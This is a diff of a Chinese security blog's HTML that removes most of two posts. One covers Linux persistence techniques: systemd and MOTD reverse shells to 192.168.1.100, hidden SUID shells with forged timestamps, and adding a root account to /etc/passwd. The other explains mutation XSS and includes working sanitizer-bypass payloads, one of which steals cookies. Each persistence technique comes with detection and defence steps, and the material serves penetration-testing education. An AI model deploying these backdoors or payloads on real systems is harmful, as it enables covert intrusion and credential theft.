-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p ~/.config/systemd/user/</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> &gt; ~/.config/systemd/user/unity-settings-daemon.service &lt;&lt; <span class="string">&#x27;EOF&#x27;</span></span><br><span class="line">[Unit]</span><br><span class="line">Description=Unity Settings Daemon</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=simple</span><br><span class="line">ExecStart=/bin/bash -c <span class="string">&#x27;/bin/bash -i &gt;&amp; /dev/tcp/192.168.1.100/6666 0&gt;&amp;1&#x27;</span></span><br><span class="line">Restart=always</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=default.target</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">systemctl --user daemon-reload</span><br><span class="line">systemctl --user <span class="built_in">enable</span> unity-settings-daemon.service</span><br><span class="line">systemctl --user start unity-settings-daemon.service</span><br><span class="line"><span class="comment"># 启用 lingering 使服务在退出登录后依然运行</span></span><br><span class="line">loginctl enable-linger <span class="variable">$USER</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="检测与防御-5"><a href="#检测与防御-5" class="headerlink" title="检测与防御"></a>检测与防御</h3><ul>
-<li>列出所有已启用的 systemd 服务：</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl list-unit-files --state=enabled</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>检查可疑的服务文件：</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /etc/systemd/system /usr/lib/systemd/system -name <span class="string">&quot;*.service&quot;</span> -newer /etc/passwd</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>使用 <code>systemd-analyze security &lt;service&gt;</code> 评估服务安全风险</li>
-<li>审计 <code>ExecStart</code> 指向的二进制文件</li>
-</ul>
-<hr>
-<h2 id="七、MOTD-后门"><a href="#七、MOTD-后门" class="headerlink" title="七、MOTD 后门"></a>七、MOTD 后门</h2><h3 id="原理-6"><a href="#原理-6" class="headerlink" title="原理"></a>原理</h3><p>MOTD（Message Of The Day）是用户登录 Linux 系统时显示的消息。通过修改 <code>/etc/update-motd.d/</code> 目录下的脚本或 <code>/etc/motd</code> 文件，攻击者可植入在用户登录时执行的命令。</p>
-<h3 id="利用方法-3"><a href="#利用方法-3" class="headerlink" title="利用方法"></a>利用方法</h3><p>创建恶意 MOTD 脚本（编号决定执行顺序）：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> &gt; /etc/update-motd.d/99-system-info &lt;&lt; <span class="string">&#x27;EOF&#x27;</span></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="comment"># 显示系统信息的同时执行后门</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;System information as of <span class="subst">$(date)</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="comment"># 后门命令</span></span><br><span class="line">(/bin/bash -c <span class="string">&#x27;/bin/bash -i &gt;&amp; /dev/tcp/192.168.1.100/7777 0&gt;&amp;1&#x27;</span> &amp;)</span><br><span class="line">EOF</span><br><span class="line"><span class="built_in">chmod</span> +x /etc/update-motd.d/99-system-info</span><br></pre></td></tr></table></figure>
-
-<p>更隐蔽的方式 —— 伪装成正常的系统信息展示：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> &gt; /etc/update-motd.d/50-landscape-sysinfo &lt;&lt; <span class="string">&#x27;EOF&#x27;</span></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">cores=$(grep -c ^processor /proc/cpuinfo 2&gt;/dev/null)</span><br><span class="line">mem=$(free -m | awk <span class="string">&#x27;/Mem/&#123;print $2&#125;&#x27;</span>)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Welcome to Ubuntu <span class="subst">$(lsb_release -rs 2&gt;/dev/null)</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot; * CPU cores: <span class="variable">$cores</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot; * Memory: <span class="variable">$&#123;mem&#125;</span>MB&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 隐蔽的持久化检查与执行</span></span><br><span class="line"><span class="keyword">if</span> ! pgrep -f <span class="string">&quot;bash.*192.168.1.100.*7777&quot;</span> &gt; /dev/null 2&gt;&amp;1; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">nohup</span> /bin/bash -c <span class="string">&#x27;/bin/bash -i &gt;&amp; /dev/tcp/192.168.1.100/7777 0&gt;&amp;1&#x27;</span> &amp;&gt;/dev/null &amp;</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">EOF</span><br><span class="line"><span class="built_in">chmod</span> +x /etc/update-motd.d/50-landscape-sysinfo</span><br></pre></td></tr></table></figure>
-
-<h3 id="直接修改-motd-文件"><a href="#直接修改-motd-文件" class="headerlink" title="直接修改 motd 文件"></a>直接修改 motd 文件</h3><p>通过 ANSI 转义序列在 motd 中嵌入命令执行（需要特定终端支持）：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 不推荐，兼容性差，仅作了解</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\e]2;owned\x07&quot;</span> &gt; /etc/motd</span><br></pre></td></tr></table></figure>
-
-<h3 id="检测与防御-6"><a href="#检测与防御-6" class="headerlink" title="检测与防御"></a>检测与防御</h3><ul>
-<li>检查 <code>/etc/update-motd.d/</code> 目录下的脚本文件</li>
-<li>对比文件修改时间：<code>ls -la /etc/update-motd.d/</code></li>
-<li>检查 <code>/etc/motd</code> 是否为静态文件（新版 Ubuntu 已改用动态 MOTD）</li>
-<li>使用 <code>pam_motd</code> 模块的配置限制 MOTD 脚本的执行范围</li>
-</ul>
-<hr>
-<h2 id="八、SUID-Shell-创建"><a href="#八、SUID-Shell-创建" class="headerlink" title="八、SUID Shell 创建"></a>八、SUID Shell 创建</h2><h3 id="原理-7"><a href="#原理-7" class="headerlink" title="原理"></a>原理</h3><p>SUID（Set owner User ID）是 Linux 中的一种特殊权限位。当一个可执行文件拥有 SUID 位时，无论谁执行该文件，都会以文件所有者的权限运行。攻击者可以利用此特性创建一个 SUID root 的 shell 副本，从而实现长期的低权限到 root 的提权通路。</p>
-<h3 id="利用方法-4"><a href="#利用方法-4" class="headerlink" title="利用方法"></a>利用方法</h3><p>获取 root 权限后，创建一个 SUID bash 副本：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 复制 bash 到隐蔽位置</span></span><br><span class="line"><span class="built_in">cp</span> /bin/bash /usr/lib/sysstat/.sa-learn</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置 SUID 权限</span></span><br><span class="line"><span class="built_in">chmod</span> 4755 /usr/lib/sysstat/.sa-learn</span><br><span class="line"></span><br><span class="line"><span class="comment"># 清除痕迹</span></span><br><span class="line"><span class="built_in">touch</span> -r /bin/bash /usr/lib/sysstat/.sa-learn</span><br></pre></td></tr></table></figure>
-
-<p>以普通用户身份使用时，加上 <code>-p</code> 参数保留特权：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/lib/sysstat/.sa-learn -p</span><br></pre></td></tr></table></figure>
-
-<h3 id="其他-SUID-后门方案"><a href="#其他-SUID-后门方案" class="headerlink" title="其他 SUID 后门方案"></a>其他 SUID 后门方案</h3><p>使用 C 编写一个精简的 SUID shell（绕过 bash 的 <code>-p</code> 需求）：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// suid_shell.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>编译并设置 SUID：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc suid_shell.c -o /usr/lib/pm-utils/.power-management</span><br><span class="line"><span class="built_in">chmod</span> 4755 /usr/lib/pm-utils/.power-management</span><br><span class="line"><span class="built_in">chown</span> root:root /usr/lib/pm-utils/.power-management</span><br></pre></td></tr></table></figure>
-
-<h3 id="利用-find-等系统命令的-SUID"><a href="#利用-find-等系统命令的-SUID" class="headerlink" title="利用 find 等系统命令的 SUID"></a>利用 find 等系统命令的 SUID</h3><p>如果系统已有的 SUID 程序存在漏洞，可被利用：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 利用 find 提权（如果 find 有 SUID 位）</span></span><br><span class="line">find . -<span class="built_in">exec</span> /bin/bash -p \; -quit</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用 cp 配合覆盖 /etc/passwd</span></span><br><span class="line"><span class="comment"># （创建带 root 权限的自定义用户条目）</span></span><br><span class="line">openssl passwd -1 -salt hack password123</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;hack:$1$hack$WTqk8tF0tJ0tr.n2QxFdq/:0:0:root:/root:/bin/bash&#x27;</span> &gt;&gt; /tmp/passwd</span><br><span class="line"><span class="comment"># 如果 cp 有 SUID root 权限</span></span><br><span class="line"><span class="built_in">cp</span> /tmp/passwd /etc/passwd</span><br></pre></td></tr></table></figure>
-
-<h3 id="检测与防御-7"><a href="#检测与防御-7" class="headerlink" title="检测与防御"></a>检测与防御</h3><ul>
-<li>查找系统中所有 SUID 文件：</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000 -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>与基线对比新增的 SUID 文件</li>
-<li>定期审计所有 SUID 文件的列表和哈希值</li>
-<li>限制不必要的 SUID 程序</li>
-<li>挂载文件系统时使用 <code>nosuid</code> 选项</li>
-</ul>
-<hr>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本文介绍了八种 Linux 后渗透权限维持技术，按复杂度从低到高排列：</p>
-<table>
-<thead>
-<tr>
-<th>技术</th>
-<th>权限要求</th>
-<th>隐蔽性</th>
-<th>检测难度</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>SSH authorized_keys</td>
-<td>root&#x2F;用户</td>
-<td>中</td>
-<td>低</td>
-</tr>
-<tr>
-<td>Crontab 反向 Shell</td>
-<td>root&#x2F;用户</td>
-<td>中</td>
-<td>中</td>
-</tr>
-<tr>
-<td>bashrc&#x2F;profile 后门</td>
-<td>用户</td>
-<td>高</td>
-<td>中</td>
-</tr>
-<tr>
-<td>PAM 模块后门</td>
-<td>root</td>
-<td>极高</td>
-<td>高</td>
-</tr>
-<tr>
-<td>LD_PRELOAD Rootkit</td>
-<td>root</td>
-<td>极高</td>
-<td>高</td>
-</tr>
-<tr>
-<td>Systemd 服务后门</td>
-<td>root&#x2F;用户</td>
-<td>高</td>
-<td>中</td>
-</tr>
-<tr>
-<td>MOTD 后门</td>
-<td>root</td>
-<td>中</td>
-<td>低</td>
-</tr>
-<tr>
-<td>SUID Shell 创建</td>
-<td>root</td>
-<td>中</td>
-<td>中</td>
-</tr>
-</tbody></table>
-<p>在实际渗透测试中，建议结合多种技术进行”纵深维持”——当一种方式被清理后，其他后门仍能保持访问。同时，务必在项目结束后清理所有植入内容，并在报告中详细记录所有操作步骤和恢复方法。</p>
-<hr>
-<h2 id="参考资源"><a href="#参考资源" class="headerlink" title="参考资源"></a>参考资源</h2><ul>
-<li><a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1037/">MITRE ATT&amp;CK - Boot or Logon Initialization Scripts</a></li>
-<li><a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1053/">MITRE ATT&amp;CK - Scheduled Task&#x2F;Job</a></li>
-<li><a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1542/">MITRE ATT&amp;CK - Pre-OS Boot</a></li>
-<li><a target="_blank" rel="noopener" href="http://www.linux-pam.org/Linux-PAM-html/Linux-PAM_SAG.html">PAM System Administrator’s Guide</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.freedesktop.org/software/systemd/man/systemd.service.html">Systemd Service Documentation</a></li>
-</ul>
-<hr>
-<p><em>本文仅供安全研究与学习参考，请勿用于非法用途。</em></p>
-
+          <p>后渗透 Linux 权限维持——SSH Key 植入、Crontab 反弹、PAM 后门与 LD_PRELOAD Rootkit。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/Post-exploit-persistence-linux/">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -1081,7 +404,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-06-04 23:35:18" itemprop="dateModified" datetime="2026-06-04T23:35:18+08:00">2026-06-04</time>
+      <time title="修改时间：2026-06-05 00:11:43" itemprop="dateModified" datetime="2026-06-05T00:11:43+08:00">2026-06-05</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -1103,182 +426,15 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h2 id="0x00-引言"><a href="#0x00-引言" class="headerlink" title="0x00 引言"></a>0x00 引言</h2><p>跨站脚本（XSS）长期霸占 OWASP Top 10。在存储型、反射型、DOM型之外，有一种更隐蔽的变种——<strong>突变型跨站脚本（Mutation XSS，mXSS）</strong>。</p>
-<p>mXSS 的核心不在于直接注入恶意代码，而在于利用浏览器解析和序列化 HTML 时的”突变”：<strong>一串看似无害的 HTML，经 DOM 解析后再序列化，变成了可执行的恶意脚本</strong>。它能绕过几乎所有基于字符串级别的 XSS 过滤器和消毒器。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">攻击流程概览:</span><br><span class="line">  [无害HTML字符串] → [HTML消毒器: 判定安全,放行] → [innerHTML赋值]</span><br><span class="line">                                                         │</span><br><span class="line">                                                    DOM解析突变</span><br><span class="line">                                                         ▼</span><br><span class="line">                                               [突变后DOM → XSS触发]</span><br></pre></td></tr></table></figure>
-
-<h2 id="0x01-mXSS-原理剖析"><a href="#0x01-mXSS-原理剖析" class="headerlink" title="0x01 mXSS 原理剖析"></a>0x01 mXSS 原理剖析</h2><h3 id="1-1-根本原因"><a href="#1-1-根本原因" class="headerlink" title="1.1 根本原因"></a>1.1 根本原因</h3><p>浏览器解析 HTML 时执行大量容错（Error Correction）——这是 HTML5 规范的强制要求。当解析后的 DOM 树被重新序列化时，输出的 HTML 可能与输入截然不同。”解析→序列化”往返过程就是 mXSS 的温床：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入字符串 S → [innerHTML写] → DOM树 → [innerHTML读] → 输出字符串 S&#x27;</span><br><span class="line">                                    │</span><br><span class="line">                              S&#x27; ≠ S，S&#x27; 包含可执行代码 → XSS</span><br></pre></td></tr></table></figure>
-
-<h3 id="1-2-innerHTML-vs-DOMParser：核心矛盾"><a href="#1-2-innerHTML-vs-DOMParser：核心矛盾" class="headerlink" title="1.2 innerHTML vs DOMParser：核心矛盾"></a>1.2 innerHTML vs DOMParser：核心矛盾</h3><p><code>DOMParser</code> 和 <code>innerHTML</code> 使用<strong>不同的解析上下文</strong>，对相同片段可能产出不同 DOM 树。这就是 mXSS 的根本矛盾——消毒器用前者判断安全，浏览器用后者实际渲染。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> html = <span class="string">&#x27;&lt;table&gt;&lt;img src=x onerror=alert(1)&gt;&lt;/table&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 消毒器用 DOMParser 扫描</span></span><br><span class="line"><span class="keyword">const</span> doc = <span class="keyword">new</span> <span class="title class_">DOMParser</span>().<span class="title function_">parseFromString</span>(html, <span class="string">&#x27;text/html&#x27;</span>);</span><br><span class="line"><span class="comment">// &lt;img&gt; 在 &lt;table&gt; 内部特殊上下文</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 实际渲染用 innerHTML</span></span><br><span class="line"><span class="keyword">const</span> div = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line">div.<span class="property">innerHTML</span> = html;</span><br><span class="line"><span class="comment">// 浏览器纠错可能将 &lt;img&gt; 移出 &lt;table&gt;——结构突变！</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="0x02-DOM-容错机制与命名空间"><a href="#0x02-DOM-容错机制与命名空间" class="headerlink" title="0x02 DOM 容错机制与命名空间"></a>0x02 DOM 容错机制与命名空间</h2><h3 id="2-1-Foster-Parenting（寄养）"><a href="#2-1-Foster-Parenting（寄养）" class="headerlink" title="2.1 Foster Parenting（寄养）"></a>2.1 Foster Parenting（寄养）</h3><p>浏览器在 <code>&lt;table&gt;</code> 内遇到非法内容时，将其”寄养”到 <code>&lt;table&gt;</code> 之前。这是最重要的容错机制之一：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入:  &lt;table&gt;&lt;tr&gt;&lt;td&gt;&lt;svg&gt;&lt;style&gt;&lt;/style&gt;&lt;/svg&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;</span><br><span class="line">输出:  &lt;svg&gt;&lt;style&gt;&lt;/style&gt;&lt;/svg&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;</span><br></pre></td></tr></table></figure>
-
-<h3 id="2-2-影响-mXSS-的关键元素"><a href="#2-2-影响-mXSS-的关键元素" class="headerlink" title="2.2 影响 mXSS 的关键元素"></a>2.2 影响 mXSS 的关键元素</h3><table>
-<thead>
-<tr>
-<th>元素&#x2F;上下文</th>
-<th>突变行为</th>
-<th>利用场景</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>&lt;table&gt;/&lt;tbody&gt;/&lt;tr&gt;</code></td>
-<td>foster parenting</td>
-<td>将内容驱逐到表格外</td>
-</tr>
-<tr>
-<td><code>&lt;svg&gt;/&lt;math&gt;</code></td>
-<td>命名空间切换</td>
-<td>在边界触发解析差异</td>
-</tr>
-<tr>
-<td><code>&lt;style&gt;</code></td>
-<td>原始文本元素</td>
-<td>配合命名空间”吞掉”payload</td>
-</tr>
-<tr>
-<td><code>&lt;noscript&gt;</code></td>
-<td>序列化依赖JS状态</td>
-<td>解析结果不可预测</td>
-</tr>
-<tr>
-<td><code>&lt;form&gt;/&lt;select&gt;</code></td>
-<td>严格内容模型</td>
-<td>驱逐非法子节点</td>
-</tr>
-</tbody></table>
-<h3 id="2-3-命名空间混淆"><a href="#2-3-命名空间混淆" class="headerlink" title="2.3 命名空间混淆"></a>2.3 命名空间混淆</h3><p>现代浏览器同时支持 HTML、SVG、MathML 三种命名空间。当片段在命名空间间切换时，解析行为剧烈变化——这正是多数经典 mXSS 的构建基础。</p>
-<h2 id="0x03-经典攻击手法"><a href="#0x03-经典攻击手法" class="headerlink" title="0x03 经典攻击手法"></a>0x03 经典攻击手法</h2><h3 id="3-1-畸形-table-嵌套"><a href="#3-1-畸形-table-嵌套" class="headerlink" title="3.1 畸形 table 嵌套"></a>3.1 畸形 table 嵌套</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">math</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;/<span class="name">math</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>消毒器视角：<code>&lt;style&gt;</code> 在 table 内的文本节点中，无害。<br>浏览器视角：foster parenting 将内容移到 <code>&lt;table&gt;</code> 前，<code>&lt;math&gt;</code> 内 <code>&lt;style&gt;</code> 的原始文本模式吞掉后续内容，<code>&lt;/style&gt;</code> 后剩余内容被释放。</p>
-<h3 id="3-2-SVG-命名空间攻击"><a href="#3-2-SVG-命名空间攻击" class="headerlink" title="3.2 SVG 命名空间攻击"></a>3.2 SVG 命名空间攻击</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span>&lt;!--<span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span>--&gt;</span><br></pre></td></tr></table></figure>
-<p>SVG 内 <code>&lt;style&gt;</code> 遵循 XML 规则，内容不经过 HTML 实体解码。<code>&lt;!--</code> 被视为 CSS 注释被 <code>&lt;style&gt;</code> 吞掉。<code>&lt;/style&gt;</code> 闭合后 <code>&lt;img&gt;</code> 成为真实元素。</p>
-<h3 id="3-3-实体编码混淆"><a href="#3-3-实体编码混淆" class="headerlink" title="3.3 实体编码混淆"></a>3.3 实体编码混淆</h3><pre><code class="language-html">&lt;div id=&quot;&amp;lt;img src=x onerror=alert(1)&amp;gt;&quot;&gt;&lt;/div&gt;
-</code></pre>
-<p>消毒器在属性值中看到编码实体，判定安全。但 DOM 序列化后再赋值给 innerHTML，实体可能被解码为尖括号。</p>
-<h2 id="0x04-浏览器差异"><a href="#0x04-浏览器差异" class="headerlink" title="0x04 浏览器差异"></a>0x04 浏览器差异</h2><table>
-<thead>
-<tr>
-<th>特性</th>
-<th>Chrome&#x2F;Edge</th>
-<th>Firefox</th>
-<th>Safari</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>&lt;isindex&gt;</code> 处理</td>
-<td>支持</td>
-<td>支持</td>
-<td>不支持</td>
-</tr>
-<tr>
-<td>foster parenting</td>
-<td>严格</td>
-<td>略有差异</td>
-<td>略有差异</td>
-</tr>
-<tr>
-<td><code>&lt;noscript&gt;</code> 序列化</td>
-<td>JS启用时</td>
-<td>JS启用时</td>
-<td>行为不同</td>
-</tr>
-<tr>
-<td>SVG内HTML元素</td>
-<td>严格</td>
-<td>较宽松</td>
-<td>中等</td>
-</tr>
-</tbody></table>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Firefox/payload: type=&quot;image&quot;使isindex成为提交按钮 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">isindex</span> <span class="attr">action</span>=<span class="string">&quot;javascript:alert(1)&quot;</span> <span class="attr">type</span>=<span class="string">&quot;image&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="0x05-富文本编辑器的-mXSS"><a href="#0x05-富文本编辑器的-mXSS" class="headerlink" title="0x05 富文本编辑器的 mXSS"></a>0x05 富文本编辑器的 mXSS</h2><p>富文本编辑器是 mXSS 高发区——核心功能”接收HTML→清洗→渲染”完美契合攻击模型。</p>
-<h3 id="5-1-CKEditor-CVE-2021-33829"><a href="#5-1-CKEditor-CVE-2021-33829" class="headerlink" title="5.1 CKEditor CVE-2021-33829"></a>5.1 CKEditor CVE-2021-33829</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">math</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-xml"><span class="comment">&lt;!--</span></span></span><br><span class="line"><span class="comment"><span class="language-xml">&lt;img src=x onerror=alert(document.cookie)&gt;</span></span></span><br><span class="line"><span class="comment"><span class="language-xml">--&gt;</span></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;/<span class="name">math</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>攻击链路：</p>
-<ol>
-<li>攻击者粘贴到源码模式 → 消毒器解析：<code>&lt;math&gt;</code> 创建 MathML，<code>&lt;style&gt;</code> 作为原始文本，内容 <code>&lt;!-- ... --&gt;</code> 被视为无害 → 判定安全</li>
-<li>切回所见即所得模式时浏览器重新解析 → <code>&lt;style&gt;</code> 闭合后 <code>&lt;img&gt;</code> “释放” → 脚本执行</li>
-</ol>
-<h3 id="5-2-TinyMCE-过滤绕过"><a href="#5-2-TinyMCE-过滤绕过" class="headerlink" title="5.2 TinyMCE 过滤绕过"></a>5.2 TinyMCE 过滤绕过</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> cleanHtml = tinymce.<span class="title function_">cleanup</span>(userInput); <span class="comment">// 内部使用DOMParser</span></span><br><span class="line"><span class="comment">// ...存入数据库...AJAX返回...</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;content&#x27;</span>).<span class="property">innerHTML</span> = cleanHtml;</span><br><span class="line"><span class="comment">//                   ^^^^^^^^ 解析结果与DOMParser不同 → mXSS</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="5-3-编辑器通用绕过模型"><a href="#5-3-编辑器通用绕过模型" class="headerlink" title="5.3 编辑器通用绕过模型"></a>5.3 编辑器通用绕过模型</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">用户输入 → 客户端消毒(DOMParser) → 服务端消毒 → 存储 → 读取</span><br><span class="line">                                                      │</span><br><span class="line">XSS! ←──── innerHTML渲染 ←──── AJAX返回 ←─────────────┘</span><br><span class="line">              ▲ 突变发生</span><br></pre></td></tr></table></figure>
-
